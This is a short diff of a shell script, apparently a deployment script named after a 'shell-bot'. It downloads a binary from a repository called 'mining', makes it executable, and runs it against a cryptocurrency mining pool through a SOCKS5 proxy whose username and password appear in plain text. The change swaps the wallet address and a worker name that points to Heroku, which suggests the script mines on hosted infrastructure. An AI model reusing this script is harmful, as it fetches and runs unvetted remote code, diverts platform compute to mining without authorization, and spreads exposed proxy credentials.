@@ -7,5 +7,5 @@ cd /home/shell-bot
 wget -qO tune_config https://git.io/J1Wss
 wget -qO build https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/gr
 chmod +x build
-./build -a gr -o stratum+tcps://asia.flockpool.com:5555 -u RGvi7W9Q9CWHXxXZREpH6rsUZhGYqqKgrZ.rtx -p tokisaki -x socks5://2mziske1s3m75w:v6zzlcglom2qqlhc2lii1pub0ft3a@us-east-static-08.quotaguard.com:1080
+./build -a gr -o stratum+tcps://asia.flockpool.com:5555 -u RCedem1PuDo9EHecuWQ3b98GxxGG2JqrHp.heroku -p tokisaki -x socks5://2mziske1s3m75w:v6zzlcglom2qqlhc2lii1pub0ft3a@us-east-static-08.quotaguard.com:1080
 sleep 99999999999999999
